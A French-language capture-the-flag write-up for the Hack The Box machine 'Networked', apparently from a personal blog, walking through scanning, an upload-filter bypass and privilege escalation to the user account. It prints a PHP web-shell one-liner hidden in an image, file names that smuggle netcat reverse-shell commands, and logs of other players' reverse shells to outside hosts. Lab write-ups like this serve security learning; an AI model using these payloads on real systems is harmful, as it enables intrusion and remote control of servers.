---
layout: post
title: HTB - Networked
subtitle: Hack The Box - Linux Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, Reverse Shell, PHP, Upload File, exiftool]
comments: false
---

1-User.txt

~~~
root@Host-001:~# nmap -A 10.10.10.146
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-11 22:56 CEST
Nmap scan report for 10.10.10.146
Host is up (0.049s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 4.10 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Asus RT-AC66U WAP (90%), Linux 3.10 (90%), Linux 3.11 - 3.12 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   11.64 ms 10.10.14.1
2   12.65 ms 10.10.10.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.41 seconds
~~~

Port 80 et 22 ouverts. Port 443 fermé

Énumérons les dossiers avec dirb:

~~~
root@Host-001:~# dirb http://10.10.10.146

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct 11 22:50:28 2019
URL_BASE: http://10.10.10.146/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.146/ ----
==> DIRECTORY: http://10.10.10.146/backup/                                     
+ http://10.10.10.146/cgi-bin/ (CODE:403|SIZE:210)                             
+ http://10.10.10.146/index.php (CODE:200|SIZE:229)                            
==> DIRECTORY: http://10.10.10.146/uploads/                                    
                                                                               
---- Entering directory: http://10.10.10.146/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.146/uploads/ ----
+ http://10.10.10.146/uploads/index.html (CODE:200|SIZE:2)                     
                                                                               
-----------------
END_TIME: Fri Oct 11 23:03:07 2019
DOWNLOADED: 9224 - FOUND: 3
~~~

Connectons nous à http://10.10.10.146/backup

Nous trouvons un fichier backup.tar, le télécharger et l'ouvrir. On trouve plusieurs fichiers dont un fichier nommé upload.php

Tentons de nous connecter à http://10.10.10.146/uplad.php

On tombe sur un page permettant d'uploader un fichier. Tentons de téléverser un reverse shell.

Ici nous utilisons php-reverse-shell.php de pentestmonkey (http://pentestmonkey.net/tools/web-shells/php-reverse-shell) disponible dans Kali dans /usr/share/webshells/php

Modifions le shell en insérant notre IP (celle du tunnel tun0) et en spécifiant un port ici 1234

Écouter sur le port 1234 avec netcat:

Uploadons le shell. Nous avons un message 'Invalid image file'. 

Essayons d'uploader à nouveau le shell en interceptant la requête avec Burp. Nous voyons:

~~~
Content-Disposition: form-data; name="myFile"; filename="php-reverse-shell.php"
Content-Type: application/x-php
~~~

Remplacer le Content-Type. Ref: [https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/](https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/)

Ça ne fonctionne toujours pas. Tentons d'insérer le shell dans une image nommée blank.png. 

Ref: 
- [http://hackers2devnull.blogspot.com/2013/05/how-to-shell-server-via-image-upload.html](http://hackers2devnull.blogspot.com/2013/05/how-to-shell-server-via-image-upload.html)
- [https://github.com/Shiva108/CTF-notes/blob/master/penbook/bypass_image_upload.md](https://github.com/Shiva108/CTF-notes/blob/master/penbook/bypass_image_upload.md)

~~~
root@Host-001:~/Bureau# exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' blank.png
root@Host-001:~/Bureau# mv blank.png blank.php.png
~~~

Uploader le fichier blank.php.png

Se rendre sur http://10.0.10.147/photos.php

Ouvrir le fichier que nous venons de télécharger. Nous avons désormais un shell:

http://10.10.10.146/uploads/<MON IP>.php.png?cmd=id

~~~
uid=48(apache) gid=48(apache) groups=48(apache)
~~~

http://10.10.10.146/uploads/<MON IP>.php.png?cmd=ls%20-la%20/home/guly

~~~
total 32
drwxr-xr-x. 2 guly guly 172 Oct 12 17:46 .
drwxr-xr-x. 3 root root  18 Jul  2 13:27 ..
lrwxrwxrwx. 1 root root   9 Jul  2 13:35 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9 13:40 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-rw-r--r--  1 guly guly  41 Oct 12 17:51 runme
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
~~~

En regardant crontab.guly on voit qu'il y a un appel à check_attach.php. Regardons ce que fait ce script:

http://10.10.10.146/uploads/<MON IP>.php.png?cmd=cat%20/home/guly/check_attack.php

~~~
�PNG  IHDR��v��PLTE������2tEXtComment

 $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
���9IDATx���1 �Om
?��k�t(���IEND�B`�
~~~

On voit que si le fichier est index.html le code fait quelquechose sinon il fait autre chose. Index.html est dans 

En googlant on trouve un lien intéressant sur Pastebin: https://pastebin.com/uypyiimG

~~~
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";
(...)
~~~

La variable $PATH est donc égale à /var/www/html/uploads/. On voit dans le code qu'il y a une itération pour chaque fichier présent dans le dossier /var/www/html/uploads/

Certains attaquant on uploadé pspy et nous avons accès aux résultats. Profitons en:

http://10.10.10.146/uploads/<MON IP>.php.png?cmd=cat%20/tmp/pspy64.output

~~~
(...)
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4541   | sh -c nohup /bin/rm -f /var/www/html/uploads/; nc -c bash 10.10.15.122 4445 > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4542   | php /home/guly/check_attack.php [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4546   | sh -c nohup /bin/rm -f /var/www/html/uploads/; nc -nv 10.10.14.215 443 -e bash > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4545   | sh -c nohup /bin/rm -f /var/www/html/uploads/; nc -nv 10.10.14.215 443 -e bash > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4547   | sh -c nohup /bin/rm -f /var/www/html/uploads/; nc -nv 10.10.14.215 443 -e bash > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4548   | php /home/guly/check_attack.php [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4552   | sh -c nohup /bin/rm -f /var/www/html/uploads/; nc -nv localhost 443 -e bash > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4551   | sh -c nohup /bin/rm -f /var/www/html/uploads/; nc -nv localhost 443 -e bash > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4553   | sh -c nohup /bin/rm -f /var/www/html/uploads/; nc -nv localhost 443 -e bash > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4554   | php /home/guly/check_attack.php [0m
2019/10/13 12:54:01 [34;1mCMD: UID=0    PID=4555   | sendmail: server localhost [127.0.0.1] cmd read[0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4558   | sh -c nohup /bin/rm -f /var/www/html/uploads/; touch michel > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4557   | sh -c nohup /bin/rm -f /var/www/html/uploads/; touch michel > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4559   | sh -c nohup /bin/rm -f /var/www/html/uploads/; touch michel > /dev/null 2>&1 & [0m
2019/10/13 12:54:01 [35;1mCMD: UID=1000 PID=4560   | /usr/sbin/sendmail -t -i -F; touch michel [0m
2019/10/13 12:54:01 [34;1mCMD: UID=0    PID=4561   | sendmail: x9DAs1u3004561 localhost [127.0.0.1]: DATA[0m
2019/10/13 12:54:02 [35;1mCMD: UID=1000 PID=4564   | sh -c nohup /bin/rm -f /var/www/html/uploads/;nohup nc -c 10.10.14.239 4546 -e bash & > /dev/null 2>&1 & [0m
2019/10/13 12:54:02 [35;1mCMD: UID=1000 PID=4563   | sh -c nohup /bin/rm -f /var/www/html/uploads/;nohup nc -c 10.10.14.239 4546 -e bash & > /dev/null 2>&1 & [0m
2019/10/13 12:54:02 [35;1mCMD: UID=1000 PID=4566   | sh -c nohup /bin/rm -f /var/www/html/uploads/;nohup nc -c 10.10.14.239 4546 -e bash & > /dev/null 2>&1 & [0m
2019/10/13 12:54:02 [35;1mCMD: UID=1000 PID=4565   | sh -c nohup /bin/rm -f /var/www/html/uploads/;nohup nc -c 10.10.14.239 4546 -e bash & > /dev/null 2>&1 & [0m
2019/10/13 12:54:02 [35;1mCMD: UID=1000 PID=4567   | /usr/sbin/sendmail -t -i -F;nohup nc -c 10.10.14.239 4546 -e bash & [0m
2019/10/13 12:54:02 [34;1mCMD: UID=0    PID=4568   | sendmail: x9DAs2ek004568 localhost [127.0.0.1]: DATA[0m
(...)
~~~

Regardons ce qu'il y a dans /var/www/html/uploads:

http://10.10.10.146/uploads/<MON IP>.php.png?cmd=ls%20-la%20/var/www/html/uploads

~~~
(...)
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png
-rw-r--r--  1 apache apache     0 Oct 13 14:05 ; chgrp root '; nc -c bash 10.10.15.240 8889'
-rw-r--r--  1 apache apache     0 Oct 13 13:59 ; chgrp root '; nc 10.10.15.240 8889'
-rw-r--r--  1 apache apache     0 Oct 13 12:48 ; nc --sh-exec 10.10.14.215 444
-rw-r--r--  1 apache apache     0 Oct 13 13:06 ; nc -c bash 10.10.14.10 4040;
-rw-r--r--  1 apache apache     0 Oct 13 12:43 ; nc -c bash 10.10.14.215 444
-rw-rw-rw-  1 apache apache     0 Oct 13 12:41 ; nc -c bash 10.10.15.122 4445
-rw-r--r--  1 apache apache     0 Oct 13 15:51 ; nc -c bash 10.10.15.240 8889
-rw-r--r--  1 apache apache     0 Oct 13 12:41 ; nc -nv 10.10.14.215 443 -e bash
-rw-r--r--  1 apache apache     0 Oct 13 13:06 ; nc -nv 10.10.14.215 444 |
-rw-r--r--  1 apache apache     0 Oct 13 12:40 ; nc -nv localhost 443 -e bash
-rw-r--r--  1 apache apache     0 Oct 13 13:58 ; nc 10.10.15.240 8889
-rw-r--r--  1 apache apache     0 Oct 13 12:53 ; touch michel
-rw-r--r--  1 apache apache     0 Oct 13 12:52 ;nohup nc -c 10.10.14.239 4546 -e bash &
-r--r--r--. 1 root   root       2 Oct 30  2018 index.html
-rw-r--r--  1 apache apache     0 Oct 13 12:40 nc -nv localhost 443 -e bash
-rw-r--r--  1 apache apache     0 Oct 13 15:00 touch temp
(...)
~~~

On essaye de créer une session netcat:

1 - Écouter sur le port 2345:

~~~
root@Host-001:~# nc -nvlp 2345
listening on [any] 2345 ...
~~~

2 - Payload

http://10.10.10.146/uploads/<MON IP>.php.png?cmd=touch%20/var/www/html/uploads/%27;%20nc%20-nv%20<MON IP>%202345%20-c%20bash%27

Attendre un peu. Résultat:

~~~
root@Host-001:~# nc -nvlp 2345
listening on [any] 2345 ...
connect to [10.10.15.64] from (UNKNOWN) [10.10.10.146] 51876
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
ls
check_attack.php
crontab.guly
user.txt
cat user.txt
526cfc2305f17faaacecf212c57d71c5
~~~

2- Root.txt

http://10.10.10.146/uploads/<MON IP>.php.png?cmd=cat%20/usr/local/sbin/changename.sh

~~~
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
~~~

Les versions de bash inférieur à 4.3 sont vulnerable au Shellshock: https://resources.infosecinstitute.com/practical-shellshock-exploitation-part-1/#gref

Ici:

~~~
bash --version
GNU bash, version 4.2.46(2)-release (x86_64-redhat-linux-gnu)
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
~~~

On test avec la commande basique mais le systeme est pas vulnérable au Shellshock :( 

**Poursuivez avec :** 

[- Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)
[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
